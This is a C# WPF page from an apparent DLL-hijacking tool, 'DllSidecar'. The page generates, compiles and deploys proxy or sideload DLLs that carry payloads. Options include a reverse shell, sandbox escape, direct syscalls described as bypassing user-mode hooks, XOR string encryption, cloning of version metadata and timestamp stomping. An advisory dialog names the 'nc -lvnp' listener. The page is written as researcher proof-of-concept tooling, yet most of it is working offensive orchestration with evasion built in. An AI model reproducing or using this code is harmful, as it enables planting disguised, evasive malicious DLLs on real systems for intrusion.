using System.IO;
using System.Windows;
using System.Windows.Controls;
using Microsoft.Win32;
using DllSidecar.Core.Configuration;
using DllSidecar.Core.Models;
using DllSidecar.Core.Services;

namespace DllSidecar.GUI.Views;

public partial class GeneratePage : Page
{
    private readonly MainWindow _main;
    // Mode is driven by the [Proxy | Sideload] segmented switch in the page header.
    // Tracer is no longer reachable from the UI; default starts at Proxy and the
    // initial pick auto-flips to Sideload if the loaded analysis has no named exports.
    private GenerationMode _mode = GenerationMode.Proxy;
    private PeAnalysis? _analysis;
    // Suppresses the mode-switch handler during initial XAML hydration. Starts true:
    // ModeProxy has IsChecked="True" in XAML, which fires Checked DURING
    // InitializeComponent before ExportPanel/ThreadPanel exist. The ctor flips it
    // back to false after wiring.
    private bool _suppressModeChange = true;

    // Deploy context, page-local so HostExeBox edits persist until Generate.
    // Seeded from _main.PendingDeployContext (drained on ctor) or null when the
    // user arrived at this page without a phantom hand-off.
    private string? _deployDir;
    private string? _deployName;
    private string? _systemOrigPath;
    // Guards against the ArchToggle_Changed handler firing during programmatic
    // IsChecked=true on initial seed — only user clicks should re-resolve.
    private bool _suppressArchToggle;
    // Guards against PersistUiState firing while RestoreUiState is still writing
    // values into the controls (otherwise every programmatic set fires a save).
    private bool _suppressPersist;

    // AppPaths centralises dev-vs-installed resolution. In dev TemplatesDir =
    // src/templates and OutputRoot = src/output; in installed mode templates
    // live next to the exe (bundled by setup.iss) and output drops into
    // %LOCALAPPDATA%\DllSidecar\output (writable without admin).

    /// <summary>
    /// Convenience overload — callers (Scan / Analyze) hand off a recommended technique
    /// based on what the user just picked. Tracer is no longer a UI mode, so any caller
    /// passing it falls through to Sideload. The auto-pick still kicks in if the analysis
    /// has no named exports (Proxy needs at least one).
    /// </summary>
    public GeneratePage(MainWindow main, GenerationMode preferred) : this(main)
    {
        _suppressModeChange = true;
        if (preferred == GenerationMode.Sideload || preferred == GenerationMode.Tracer)
            ModeSideload.IsChecked = true;
        else
            ModeProxy.IsChecked = true;
        _suppressModeChange = false;
        ApplyMode();
    }

    public GeneratePage(MainWindow main)
    {
        _main = main;
        InitializeComponent();

        PageTitle.Text = "DLL Techniques";

        PopulateXorKeys();
        UpdateDeployBanner();

        // Prefer a pre-existing CurrentAnalysis (e.g. synthesized phantom) over re-analyzing
        // the file — phantoms don't exist on disk, so PeAnalyzer would throw.
        if (_main.CurrentAnalysis != null)
        {
            _analysis = _main.CurrentAnalysis;
            DllPathBox.Text = _main.CurrentDllPath ?? _analysis.Path;
            PopulateFromAnalysis(_analysis);
        }
        else if (_main.CurrentDllPath != null)
        {
            DllPathBox.Text = _main.CurrentDllPath;
            LoadAnalysis(_main.CurrentDllPath);
        }

        // Auto-pick the technique from the loaded analysis: Proxy needs named exports,
        // Sideload works always. Mirrors the wizard's CraftStage selection logic.
        _suppressModeChange = true;
        if (_analysis != null && _analysis.NamedExports == 0)
            ModeSideload.IsChecked = true;
        else
            ModeProxy.IsChecked = true;
        _suppressModeChange = false;
        ApplyMode();

        // Restore last-session UI state, then wire change handlers so every edit persists.
        RestoreUiState();
        ApplySandboxRecommendation();
        WirePersistence();
    }

    /// <summary>
    /// Hide SandboxEscape from the Payload combo unless the active candidate's
    /// importer classifies as sandboxed. Same logic as CraftStage.ApplySandboxRecommendation —
    /// both pages share the SandboxEscapeItem + SandboxHint x:Names.
    /// </summary>
    private void ApplySandboxRecommendation()
    {
        // Best-effort candidate lookup: the active DLL path may match a scan
        // result. If we have no scan context, fall back to classifying the
        // current DLL path on its own (handles "Browse → DLL → Generate" flows
        // that bypass Scan entirely).
        var kind = SandboxKind.None;
        var path = _main.CurrentDllPath;
        if (!string.IsNullOrEmpty(path) && _main.LastScanResults != null)
        {
            var existing = _main.LastScanResults.Existing.FirstOrDefault(c =>
                string.Equals(c.Dll.Path, path, StringComparison.OrdinalIgnoreCase));
            if (existing != null) kind = existing.SandboxKind;
            else
            {
                var phantom = _main.LastScanResults.Phantoms.FirstOrDefault(p =>
                    string.Equals(System.IO.Path.Combine(p.DirectoryPath, p.DllName), path, StringComparison.OrdinalIgnoreCase));
                if (phantom != null) kind = phantom.SandboxKind;
            }
        }
        // Last-resort static classification when no scan match — handles "Browse
        // for DLL → Generate" without going through Scan.
        if (kind == SandboxKind.None && !string.IsNullOrEmpty(path))
            kind = Core.Services.SandboxClassifier.Classify(path);

        var sandboxed = kind != SandboxKind.None;
        SandboxEscapeItem.Visibility = sandboxed ? Visibility.Visible : Visibility.Collapsed;
        SandboxHint.Visibility       = sandboxed ? Visibility.Visible : Visibility.Collapsed;
        if (sandboxed)
        {
            SandboxHint.Text = kind switch
            {
                SandboxKind.AppContainer       => "AppContainer host detected — SandboxEscape recommended.",
                SandboxKind.LowIntegrity       => "Low integrity host detected — SandboxEscape recommended.",
                SandboxKind.RendererSubprocess => "Sandboxed renderer host detected (CEF / WebView2) — SandboxEscape recommended.",
                _                              => "Sandboxed host detected — SandboxEscape recommended.",
            };
        }
    }

    private void ModeSwitch_Changed(object sender, RoutedEventArgs e)
    {
        if (_suppressModeChange) return;
        ApplyMode();
    }

    /// <summary>
    /// Push the segmented switch's state into <see cref="_mode"/> and reflect it in the
    /// dependent UI: page subtitle, ExportPanel (Proxy only), ThreadPanel.
    /// </summary>
    private void ApplyMode()
    {
        // Defensive — XAML hydration order can fire RadioButton.Checked before the
        // dependent panels are instantiated. The ctor's _suppressModeChange flag is
        // the primary guard; this is a second line of defense.
        if (ModeSideload == null || ModeProxy == null) return;

        _mode = ModeSideload.IsChecked == true ? GenerationMode.Sideload : GenerationMode.Proxy;

        if (PageSubtitle != null)
            PageSubtitle.Text = _mode switch
            {
                GenerationMode.Proxy    => "Forward every export to the renamed original (_orig.dll) and fire your payload from one chosen export. Classic sideload form — host keeps working.",
                GenerationMode.Sideload => "Stub DLL with no forwarding and no _orig.dll dependency. One-shot payload fires from DllMain. Smallest footprint.",
                _ => ""
            };

        bool isProxy = _mode == GenerationMode.Proxy;
        if (ExportPanel != null) ExportPanel.Visibility = isProxy ? Visibility.Visible : Visibility.Collapsed;
        if (ThreadPanel != null) ThreadPanel.Visibility = Visibility.Visible;
    }

    private void RestoreUiState()
    {
        _suppressPersist = true;
        try
        {
            var s = ConfigManager.Current.UiState.GeneratePage;

            if (string.IsNullOrEmpty(HostExeBox.Text) && !string.IsNullOrEmpty(s.HostExePath))
                HostExeBox.Text = s.HostExePath;

            if (s.PayloadIndex >= 0 && s.PayloadIndex < PayloadCombo.Items.Count)
                PayloadCombo.SelectedIndex = s.PayloadIndex;
            if (!string.IsNullOrEmpty(s.PayloadData)) PayloadDataBox.Text = s.PayloadData;
            if (!string.IsNullOrEmpty(s.SandboxTargets)) SandboxTargetsBox.Text = s.SandboxTargets;

            if (s.ThreadModeIndex >= 0 && s.ThreadModeIndex < ThreadCombo.Items.Count)
                ThreadCombo.SelectedIndex = s.ThreadModeIndex;

            ChkDInvoke.IsChecked = s.DInvoke;
            ChkSyscalls.IsChecked = s.Syscalls;
            ChkEncrypt.IsChecked = s.EncryptStrings;
            DelayBox.Text = s.EntryDelayMs.ToString();
            if (s.XorKeyIndex >= 0 && s.XorKeyIndex < XorKeyCombo.Items.Count)
                XorKeyCombo.SelectedIndex = s.XorKeyIndex;

            ChkCloneMeta.IsChecked = s.CloneMeta;
            ChkStomp.IsChecked = s.TimestampStomp;
            ChkAutoBuild.IsChecked = s.AutoBuild;

            ChkWriteProof.IsChecked = s.WriteProof;
            PreLaunchDelayBox.Text = s.PreLaunchDelaySec.ToString();
            if (s.WaitBlock) WaitBlock.IsChecked = true; else WaitFire.IsChecked = true;
            FireTimeoutBox.Text = s.FireTimeoutSec.ToString();
            // Mirror WaitBlock state onto FireTimeoutRow visibility (XAML binding handles
            // this dynamically on user clicks, but programmatic set doesn't fire the event).
            FireTimeoutRow.Visibility = s.WaitBlock ? Visibility.Collapsed : Visibility.Visible;
        }
        finally { _suppressPersist = false; }
    }

    private void PersistUiState()
    {
        if (_suppressPersist) return;
        var s = ConfigManager.Current.UiState.GeneratePage;
        s.HostExePath = HostExeBox.Text?.Trim();
        s.PayloadIndex = PayloadCombo.SelectedIndex;
        s.PayloadData = PayloadDataBox.Text;
        s.SandboxTargets = SandboxTargetsBox.Text;
        s.ThreadModeIndex = ThreadCombo.SelectedIndex;
        s.DInvoke = ChkDInvoke.IsChecked == true;
        s.Syscalls = ChkSyscalls.IsChecked == true;
        s.EncryptStrings = ChkEncrypt.IsChecked == true;
        if (int.TryParse(DelayBox.Text, out var ms)) s.EntryDelayMs = ms;
        s.XorKeyIndex = XorKeyCombo.SelectedIndex;
        s.CloneMeta = ChkCloneMeta.IsChecked == true;
        s.TimestampStomp = ChkStomp.IsChecked == true;
        s.AutoBuild = ChkAutoBuild.IsChecked == true;
        s.WriteProof = ChkWriteProof.IsChecked == true;
        if (int.TryParse(PreLaunchDelayBox.Text, out var pld)) s.PreLaunchDelaySec = pld;
        s.WaitBlock = WaitBlock.IsChecked == true;
        if (int.TryParse(FireTimeoutBox.Text, out var ft)) s.FireTimeoutSec = ft;
        if (ArchX86.IsChecked == true) s.Arch = "x86";
        else if (ArchX64.IsChecked == true) s.Arch = "x64";
        ConfigManager.Save();
    }

    private void WirePersistence()
    {
        void OnChanged(object? _, object __) => PersistUiState();

        HostExeBox.TextChanged += OnChanged;
        PayloadCombo.SelectionChanged += OnChanged;
        PayloadDataBox.TextChanged += OnChanged;
        SandboxTargetsBox.TextChanged += OnChanged;
        ThreadCombo.SelectionChanged += OnChanged;

        ChkDInvoke.Checked += OnChanged; ChkDInvoke.Unchecked += OnChanged;
        ChkSyscalls.Checked += OnChanged; ChkSyscalls.Unchecked += OnChanged;
        ChkEncrypt.Checked += OnChanged; ChkEncrypt.Unchecked += OnChanged;
        DelayBox.TextChanged += OnChanged;
        XorKeyCombo.SelectionChanged += OnChanged;

        ChkCloneMeta.Checked += OnChanged; ChkCloneMeta.Unchecked += OnChanged;
        ChkStomp.Checked += OnChanged; ChkStomp.Unchecked += OnChanged;
        ChkAutoBuild.Checked += OnChanged; ChkAutoBuild.Unchecked += OnChanged;

        ChkWriteProof.Checked += OnChanged; ChkWriteProof.Unchecked += OnChanged;
        PreLaunchDelayBox.TextChanged += OnChanged;
        WaitBlock.Checked += OnChanged; WaitFire.Checked += OnChanged;
        FireTimeoutBox.TextChanged += OnChanged;

        ArchX86.Checked += OnChanged; ArchX64.Checked += OnChanged;
    }

    // Sentinel shown as the first item in the Target Export combo. When selected,
    // we treat TargetExport as null → GenerateProxy emits a pure-forwarder build
    // (no trampolines, .def forwards to _orig at load time). Selecting any real
    // export name falls into the trampoline variant, where payload_execute fires
    // on that specific export AND from DllMain (once-guarded).
    private const string NoHookSentinel = "(no hook — pure forwarder, payload from DllMain)";

    private void PopulateFromAnalysis(PeAnalysis a)
    {
        ExportCombo.Items.Clear();
        ExportCombo.Items.Add(NoHookSentinel);
        foreach (var exp in a.Exports)
            ExportCombo.Items.Add(exp.DisplayName);
        ExportCombo.SelectedIndex = 0;
    }

    private void UpdateDeployBanner()
    {
        // Read context on every ctor but DO NOT clear it — persists across
        // navigation (nav to DLL Proxy tab in sidebar recreates the page and
        // we want the banner to still be there). Cleared explicitly on Generate
        // success or user's Clear click.
        if (_main.PendingDeployContext is { } d)
        {
            _deployDir = d.TargetDir;
            _deployName = d.TargetName;
            _systemOrigPath = d.SystemOrigPath;
            HostExeBox.Text = d.HostExePath;

            // Seed the arch override toggle from the analysis (which inherited
            // the Scan's majority vote). User can flip if the vote picked wrong.
            ArchRow.Visibility = Visibility.Visible;
            _suppressArchToggle = true;
            if (_analysis?.Arch == "x86") ArchX86.IsChecked = true;
            else ArchX64.IsChecked = true;
            _suppressArchToggle = false;

            ApplyArchCompatibilityRules(_analysis?.Arch ?? "x64");
            RenderAutoModeText(d.AutoMode, d.AutoExportCount);
        }

        if (_deployDir != null && _deployName != null)
        {
            DeployDropText.Text = $"Drop → {_deployDir}\\{_deployName}";
            DeployBanner.Visibility = Visibility.Visible;
        }
        else
        {
            DeployBanner.Visibility = Visibility.Collapsed;
        }
    }

    private void BrowseHost_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "Executables|*.exe|All files|*.*",
            Title = "Pick the host EXE to launch after deploy",
        };
        if (!string.IsNullOrWhiteSpace(HostExeBox.Text) && File.Exists(HostExeBox.Text))
            dlg.InitialDirectory = Path.GetDirectoryName(HostExeBox.Text);
        if (dlg.ShowDialog() == true) HostExeBox.Text = dlg.FileName;
    }

    private void ClearDeploy_Click(object sender, RoutedEventArgs e)
    {
        _deployDir = null;
        _deployName = null;
        _systemOrigPath = null;
        HostExeBox.Text = "";
        AutoModeText.Visibility = Visibility.Collapsed;
        ArchRow.Visibility = Visibility.Collapsed;
        DeployBanner.Visibility = Visibility.Collapsed;
        _main.PendingDeployContext = null;
        _main.Log("Deploy context cleared — generated .bat will compile only");
    }

    private void WaitStrategy_Changed(object sender, RoutedEventArgs e)
    {
        if (FireTimeoutRow == null) return;
        FireTimeoutRow.Visibility = WaitFire.IsChecked == true
            ? Visibility.Visible : Visibility.Collapsed;
    }

    private void ArchToggle_Changed(object sender, RoutedEventArgs e)
    {
        if (_suppressArchToggle || _analysis == null) return;
        var newArch = ArchX86.IsChecked == true ? "x86" : "x64";
        if (_analysis.Arch == newArch) return;

        // Re-resolve the system DLL for the new arch so Exports, NamedExports
        // and SystemOrigPath all realign. For well-known DLLs present in both
        // System32 and SysWOW64, this swaps the _orig source + recompile target
        // without losing the forward surface.
        var resolved = SystemDllResolver.Resolve(_analysis.Filename, newArch);
        _analysis.Arch = newArch;
        _analysis.Exports = resolved?.Analysis.Exports ?? new List<ExportEntry>();
        _analysis.NamedExports = resolved?.Analysis.NamedExports ?? 0;
        _analysis.OrdinalOnlyExports = resolved?.Analysis.OrdinalOnlyExports ?? 0;
        _systemOrigPath = resolved?.Path;

        var mode = _analysis.Exports.Count > 0 ? GenerationMode.Proxy : GenerationMode.Sideload;
        RenderAutoModeText(mode, _analysis.Exports.Count);
        _main.Log($"Arch override → {newArch} (exports={_analysis.Exports.Count}, orig={_systemOrigPath ?? "none"})");

        // Refresh the export dropdown (Proxy mode) from the new arch's exports.
        PopulateFromAnalysis(_analysis);

        ApplyArchCompatibilityRules(newArch);
    }

    /// <summary>
    /// Gates options that are only meaningful (or only safe) for a specific arch.
    /// Today: DirectSyscalls — on x86 the syscall stubs are #ifdef'd out AND sc_init
    /// corrupts g_sc on i686 ntdll prologues, breaking the PoC. Hard-disable.
    /// </summary>
    private void ApplyArchCompatibilityRules(string arch)
    {
        if (ChkSyscalls == null) return;
        if (arch == "x86")
        {
            ChkSyscalls.IsChecked = false;
            ChkSyscalls.IsEnabled = false;
            ChkSyscalls.ToolTip = "Disabled — Direct syscalls require x64. On x86 it's not benign: sc_init reads i686 ntdll prologues that don't match the x64-assumed layout and corrupts global state, breaking the PoC.";
        }
        else
        {
            ChkSyscalls.IsEnabled = true;
            ChkSyscalls.ToolTip = "Resolve and call NT* APIs via SSN + syscall instruction instead of going through ntdll export addresses. Bypasses user-mode hooks.";
        }
    }

    private void RenderAutoModeText(GenerationMode? mode, int exportCount)
    {
        if (!mode.HasValue) return;
        var modeLabel = mode.Value == GenerationMode.Proxy ? "Proxy (auto)" : "Sideload (auto)";
        var detail = mode.Value == GenerationMode.Proxy
            ? $"Forwarding {exportCount} exports via _orig.dll sourced from {_systemOrigPath ?? "(none)"}"
            : (exportCount == 0
                ? "No exports required — DllMain-only stub"
                : $"No system match found — will emit {exportCount} empty stubs (host may reject)");
        AutoModeText.Text = $"◆ Mode: {modeLabel}   ·   {detail}";
        AutoModeText.Visibility = Visibility.Visible;
    }

    private void PopulateXorKeys()
    {
        var cfg = ConfigManager.Current.Xor;
        XorKeyCombo.Items.Clear();
        foreach (var k in cfg.PresetKeys)
            XorKeyCombo.Items.Add($"0x{k:X2}");
        var idx = cfg.PresetKeys.IndexOf(cfg.DefaultKey);
        XorKeyCombo.SelectedIndex = idx >= 0 ? idx : 0;
    }

    private void Browse_Click(object sender, RoutedEventArgs e)
    {
        var dlg = new OpenFileDialog
        {
            Filter = "DLL files|*.dll|All files|*.*",
            Title = "Select target DLL"
        };
        if (dlg.ShowDialog() == true)
        {
            DllPathBox.Text = dlg.FileName;
            LoadAnalysis(dlg.FileName);
        }
    }

    private void LoadAnalysis(string path)
    {
        try
        {
            _analysis = PeAnalyzer.Analyze(path);
            ExportCombo.Items.Clear();
            foreach (var exp in _analysis.Exports)
                ExportCombo.Items.Add(exp.DisplayName);
            if (ExportCombo.Items.Count > 0)
                ExportCombo.SelectedIndex = 0;
        }
        catch (Exception ex)
        {
            _main.Log($"Error loading DLL: {ex.Message}");
        }
    }

    private void PayloadCombo_Changed(object sender, SelectionChangedEventArgs e)
    {
        if (PayloadDataBox == null) return;
        // Index 4 = ReverseShell: host/port come from Config (Payload Defaults),
        // not from the per-PoC data box. Keep PayloadDataBox hidden for it.
        PayloadDataBox.Visibility = PayloadCombo.SelectedIndex switch
        {
            1 or 2 or 3 => Visibility.Visible,
            _ => Visibility.Collapsed
        };
        PayloadDataBox.Text = PayloadCombo.SelectedIndex switch
        {
            1 => "calc.exe",
            3 => "cmd.exe",
            _ => ""
        };
        if (SandboxTargetsPanel != null)
            SandboxTargetsPanel.Visibility = PayloadCombo.SelectedIndex == 3
                ? Visibility.Visible : Visibility.Collapsed;

        // ReverseShell does Winsock + CreateProcess, which is unsafe under the
        // loader lock — so when the user picks it, switch Thread mode to "New
        // thread (CreateThread)" (so do_payload runs outside DllMain) and turn
        // Write proof file on (so failures leave a %TEMP%\dllsidecar_proof_*.txt
        // breadcrumb). One-shot defaults, not locked — user can override.
        // _suppressPersist also gates the user-facing dialog: we don't want
        // a popup when RestoreUiState() flips the combo at page load.
        if (PayloadCombo.SelectedIndex == 4)
        {
            if (ThreadCombo != null) ThreadCombo.SelectedIndex = 1;   // 0=Calling, 1=Std (CreateThread), 2=Native
            if (ChkWriteProof != null) ChkWriteProof.IsChecked = true;
            if (!_suppressPersist) ShowReverseShellAdvisory();
        }
    }

    /// <summary>
    /// One-shot informational modal explaining the auto-applied defaults when
    /// the user picks ReverseShell. Kept on this page (not a global helper)
    /// because the body references the exact controls visible here.
    /// </summary>
    private static void ShowReverseShellAdvisory()
    {
        MessageBox.Show(
            "Reverse shell selected — safe defaults applied:\n\n" +
            "  • Thread mode → New thread (CreateThread)\n" +
            "      Required: Winsock + CreateProcessA under the DllMain loader\n" +
            "      lock deadlocks the host. A separate thread runs do_payload()\n" +
            "      after DllMain returns.\n\n" +
            "  • Write proof file → ON\n" +
            "      Leaves %TEMP%\\dllsidecar_proof_<PID>.txt at payload entry so\n" +
            "      you can confirm execution even if the listener never sees a\n" +
            "      connection (firewall, missing nc -lvnp, AV block).\n\n" +
            "Host / port come from Configuration → Payload Defaults.\n" +
            "Don't forget the listener: nc -lvnp <port>  (or ncat).",
            "Reverse shell — defaults applied",
            MessageBoxButton.OK, MessageBoxImage.Information);
    }

    private async void Generate_Click(object sender, RoutedEventArgs e)
    {
        var path = DllPathBox.Text.Trim();

        // Phantom mode: _analysis is pre-synthesized (no file on disk — that's the point).
        // Only require a real file when we have no analysis to use.
        bool phantomMode = _analysis != null && !File.Exists(path);
        if (_analysis == null)
        {
            if (string.IsNullOrEmpty(path) || !File.Exists(path))
            {
                MessageBox.Show("Select a valid DLL first.\n\nIf you're working from a phantom, launch Generate from ScanPage → Generate Sideload.",
                    "No target DLL",
                    MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            LoadAnalysis(path);
            if (_analysis == null) return;
        }

        // Mode-specific preconditions. We check BEFORE disabling the button / showing the
        // overlay so the error UX is immediate (no flash of "Generating..." before the
        // validation warning). Matches the AnalyzePage tile-level availability logic.
        if (_mode == GenerationMode.Proxy)
        {
            if (_analysis.NamedExports == 0)
            {
                MessageBox.Show(
                    "Proxy mode requires at least one NAMED export on the target DLL.\n\n" +
                    "The proxy forwards exports to the renamed original — with nothing to forward there's no host functionality to preserve. " +
                    "Use Sideload mode instead (payload fires from DllMain, no forwarding).",
                    "Proxy not applicable", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            // Target export is now OPTIONAL. Payload fires from DllMain by default
            // (always runs on DLL_PROCESS_ATTACH). If the user picks an export, it
            // also triggers payload (guarded so it still runs exactly once).
        }

        GenerateBtn.IsEnabled = false;
        SetStatus("Generating...", StatusKind.Info);
        Overlay.Show("Generating " + _mode, $"Target: {_analysis.Filename}");

        var xorCfg = ConfigManager.Current.Xor;
        byte xorKey = xorCfg.DefaultKey;
        if (XorKeyCombo.SelectedIndex >= 0 && XorKeyCombo.SelectedIndex < xorCfg.PresetKeys.Count)
            xorKey = xorCfg.PresetKeys[XorKeyCombo.SelectedIndex];

        var config = new TemplateConfig
        {
            Mode = _mode,
            DInvoke = ChkDInvoke.IsChecked == true,
            DirectSyscalls = ChkSyscalls.IsChecked == true,
            EncryptStrings = ChkEncrypt.IsChecked == true,
            CloneMetadata = ChkCloneMeta.IsChecked == true,
            StompTimestamps = ChkStomp.IsChecked == true,
            Payload = (PayloadType)PayloadCombo.SelectedIndex,
            PayloadData = PayloadDataBox.Text.Trim(),
            Thread = (ThreadMode)ThreadCombo.SelectedIndex,
            XorKey = xorKey,
            // Pull the researcher attribution from the Configuration page so the
            // /* Generated by DllSidecar — <handle> */ header reflects the user
            // who is actually building the PoC, not the source-tree default.
            // Empty handle -> no attribution emitted at all (clean header).
            Researcher = ConfigManager.Current.Researcher.Handle ?? "",
        };

        if (_mode == GenerationMode.Proxy
            && ExportCombo.SelectedItem is string targetExp
            && targetExp != NoHookSentinel)
            config.TargetExport = targetExp;

        int.TryParse(DelayBox.Text, out int delay);
        config.DelayMs = delay;

        // SandboxEscape-only target CSV, ignored by other payloads.
        if (PayloadCombo.SelectedIndex == 3 && !string.IsNullOrWhiteSpace(SandboxTargetsBox.Text))
            config.SandboxTargets = SandboxTargetsBox.Text.Trim();

        // MessageBox title/body come from global Config → Payload Defaults so
        // the same stamp is reused across PoCs. {Researcher} substitution and
        // C-string escaping happen inside TemplateEngine.
        var payloadCfg = ConfigManager.Current.Payload;
        config.MessageBoxTitle = payloadCfg.MessageBoxTitle;
        config.MessageBoxBody = payloadCfg.MessageBoxBody;

        // ReverseShell endpoint also comes from the global defaults — host/port
        // typically stay stable across a session (one listener, many PoCs),
        // so a per-PoC override on this page would just add noise.
        config.ReverseShellHost = payloadCfg.ReverseShellHost;
        config.ReverseShellPort = payloadCfg.ReverseShellPort;

        // Runtime / deploy options — drive the .bat tail's probe/delay/wait logic
        // and the payload's proof file write. All three have safe defaults in XAML.
        config.WriteProofFile = ChkWriteProof.IsChecked == true;
        int.TryParse(PreLaunchDelayBox.Text, out int preDelay);
        config.PreLaunchDelaySec = Math.Max(0, preDelay);
        config.WaitForHostExit = WaitBlock.IsChecked == true;
        int.TryParse(FireTimeoutBox.Text, out int fireTimeout);
        config.NonBlockingTimeoutSec = Math.Max(1, fireTimeout);

        // Deploy context — page-local state, possibly edited by the user in the
        // banner (HostExeBox). Apply only when both sides are set; if the user
        // blanked the Host field the banner stays off and we fall back to compile-only.
        var hostExe = HostExeBox.Text.Trim();
        if (_deployDir != null && _deployName != null && hostExe.Length > 0)
        {
            config.DeployTargetDir = _deployDir;
            config.DeployTargetName = _deployName;
            config.HostExePath = hostExe;
            config.SystemOrigPath = _systemOrigPath;
            _main.Log($"Deploy context: {_deployDir}\\{_deployName} → host {Path.GetFileName(hostExe)}"
                + (_systemOrigPath != null ? $" (orig source: {_systemOrigPath})" : ""));
        }

        var baseName = Path.GetFileNameWithoutExtension(_analysis.Filename);
        var modeLabel = _mode.ToString().ToLowerInvariant();
        var outputDir = Path.Combine(AppPaths.OutputRoot, $"{baseName}_{modeLabel}");
        Directory.CreateDirectory(outputDir);

        _main.Log($"Generating {_mode} for {_analysis.Filename}...");

        var files = TemplateEngine.Generate(_analysis, config);

        // Copy headers
        var templatesDir = AppPaths.TemplatesDir;
        if (config.DInvoke && File.Exists(Path.Combine(templatesDir, "dinvoke.h")))
            File.Copy(Path.Combine(templatesDir, "dinvoke.h"), Path.Combine(outputDir, "dinvoke.h"), true);
        if (config.DirectSyscalls && File.Exists(Path.Combine(templatesDir, "syscalls.h")))
            File.Copy(Path.Combine(templatesDir, "syscalls.h"), Path.Combine(outputDir, "syscalls.h"), true);
        if (config.EncryptStrings && File.Exists(Path.Combine(templatesDir, "cryptor.h")))
            File.Copy(Path.Combine(templatesDir, "cryptor.h"), Path.Combine(outputDir, "cryptor.h"), true);

        var outputInfo = new System.Text.StringBuilder();
        foreach (var (name, content) in files)
        {
            var filePath = Path.Combine(outputDir, name);
            await File.WriteAllTextAsync(filePath, content);
            outputInfo.AppendLine($"  [>] {name}");
            _main.Log($"  Written: {name}");
        }

        // Metadata cloning — only meaningful when the source DLL exists on disk.
        // For phantoms there's nothing to clone FROM; skip silently with a log note.
        if (config.CloneMetadata)
        {
            if (phantomMode)
            {
                outputInfo.AppendLine("  [i] Clone version info: skipped (phantom has no source file)");
                _main.Log("  Clone metadata skipped — phantom slot, no source PE");
            }
            else
            {
                try
                {
                    var vinfo = PeAnalyzer.ExtractVersionInfo(path);
                    if (vinfo.Count > 0)
                    {
                        var rcContent = TemplateEngine.GenerateRcFile(vinfo, _analysis.Filename);
                        await File.WriteAllTextAsync(Path.Combine(outputDir, "version.rc"), rcContent);
                        outputInfo.AppendLine("  [>] version.rc (metadata clone)");
                        _main.Log("  Written: version.rc");
                    }
                }
                catch (Exception ex)
                {
                    _main.Log($"  Metadata extraction failed: {ex.Message}");
                }
            }
        }

        // Auto-build. builtDllPath stays null when auto-build is off or the
        // compile fails; consumed by the post-build success modal below.
        string? builtDllPath = null;
        if (ChkAutoBuild.IsChecked == true)
        {
            var cFile = files.Keys.First(k => k.EndsWith(".c"));
            var defFile = files.Keys.First(k => k.EndsWith(".def"));
            var dllOutput = Path.Combine(outputDir, _analysis.Filename);

            var extraObjects = new List<string>();
            var rcFile = Path.Combine(outputDir, "version.rc");
            if (File.Exists(rcFile))
            {
                var resObj = Path.Combine(outputDir, "version.res.o");
                var progress = new Progress<string>(msg => _main.Log($"  {msg}"));
                if (await BuildSystem.CompileResourceAsync(rcFile, resObj, _analysis.Arch, progress))
                    extraObjects.Add(resObj);
            }

            var buildProgress = new Progress<string>(msg => _main.Log($"  {msg}"));
            // ws2_32 needed when the reverse-shell payload's trace code calls
            // WSAGetLastError() directly (not through a GetProcAddress pointer).
            var extraLibs = config.Payload == Core.Models.PayloadType.ReverseShell
                ? new[] { "ws2_32" } : null;
            var result = await BuildSystem.CompileDllAsync(
                Path.Combine(outputDir, cFile),
                Path.Combine(outputDir, defFile),
                dllOutput,
                _analysis.Arch,
                includeDirs: [templatesDir, outputDir],
                extraObjects: extraObjects.Count > 0 ? extraObjects : null,
                extraLibs: extraLibs,
                progress: buildProgress);

            if (result.Success)
            {
                outputInfo.AppendLine($"\n  [+] Compiled: {_analysis.Filename} ({result.OutputSize:N0} bytes, {result.ExportCount} exports)");
                builtDllPath = dllOutput;

                // Stomp only when we have a source file to copy timestamps from.
                if (config.StompTimestamps)
                {
                    if (phantomMode)
                    {
                        outputInfo.AppendLine("  [i] Timestamp stomp: skipped (phantom has no source file)");
                        _main.Log("  Timestamp stomp skipped — phantom slot, no source PE");
                    }
                    else if (File.Exists(path))
                    {
                        BuildSystem.StompTimestamps(path, dllOutput);
                        _main.Log("  Timestamps stomped");
                    }
                }
            }
            else
            {
                outputInfo.AppendLine($"\n  [!] Build failed: {result.Errors.Split('\n').FirstOrDefault()}");
            }
        }

        outputInfo.AppendLine($"\n  Output: {outputDir}");
        OutputInfo.Text = outputInfo.ToString();
        OutputPanel.Visibility = Visibility.Visible;
        _main.Log($"Generation complete: {outputDir}");
        GenerateBtn.IsEnabled = true;
        SetStatus($"Done — {outputDir}", StatusKind.Ok);
        Overlay.Hide();

        // Post-build success modal — surface the on-disk location with a one-click
        // open-in-Explorer so the researcher doesn't have to scroll the output panel
        // hunting for the path. Only fires when auto-build ran AND succeeded;
        // generation-only runs (no compile) don't pop the dialog because the
        // researcher's next step is to compile manually via BuildPage anyway.
        if (builtDllPath != null)
            Helpers.BuildCompleteDialog.Show(Window.GetWindow(this), builtDllPath);
    }

    private void Reset_Click(object sender, RoutedEventArgs e)
    {
        ChkDInvoke.IsChecked = false;
        ChkSyscalls.IsChecked = false;
        ChkEncrypt.IsChecked = false;
        ChkCloneMeta.IsChecked = false;
        ChkStomp.IsChecked = false;
        ChkAutoBuild.IsChecked = true;
        PayloadCombo.SelectedIndex = 0;
        ThreadCombo.SelectedIndex = 0;
        DelayBox.Text = "0";
        PayloadDataBox.Text = "";
        PayloadDataBox.Visibility = Visibility.Collapsed;
        // Execution section — starter defaults favour diagnosability
        ChkWriteProof.IsChecked = true;
        PreLaunchDelayBox.Text = "0";
        WaitBlock.IsChecked = true;
        FireTimeoutBox.Text = "15";
        FireTimeoutRow.Visibility = Visibility.Collapsed;
        OutputPanel.Visibility = Visibility.Collapsed;
        PopulateXorKeys();
        SetStatus("Form reset to Starter defaults", StatusKind.Info);
    }

    private enum StatusKind { Info, Ok, Err }

    private void SetStatus(string text, StatusKind kind)
    {
        GenStatus.Text = text;
        GenStatus.Foreground = new System.Windows.Media.SolidColorBrush(kind switch
        {
            StatusKind.Ok  => System.Windows.Media.Color.FromRgb(0xA6, 0xE3, 0xA1),
            StatusKind.Err => System.Windows.Media.Color.FromRgb(0xF3, 0x8B, 0xA8),
            _ => System.Windows.Media.Color.FromRgb(0x6C, 0x70, 0x86),
        });
    }
}
